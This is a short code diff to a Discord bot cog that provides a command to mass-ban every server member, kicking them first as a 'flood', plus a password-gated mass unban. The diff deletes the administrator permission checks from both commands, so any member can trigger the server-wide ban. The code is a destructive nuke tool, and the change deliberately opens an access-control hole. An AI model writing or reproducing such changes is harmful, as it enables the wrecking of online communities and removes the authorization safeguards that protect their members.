@@ -31,7 +31,6 @@ class Ban(commands.Cog):
         skip_admins="Skip members with Administrator. Default False.",
         kick_first="Kick before banning (double-action flood). Default True.",
     )
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def banevery1(
         self,
@@ -181,7 +180,6 @@ class Ban(commands.Cog):
         description="✅ Mass-unban everyone in this server. Requires password.",
     )
     @app_commands.describe(password="Required password to run this command.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def unban(self, interaction: discord.Interaction, password: str) -> None:
         if password != UNBAN_PASSWORD:
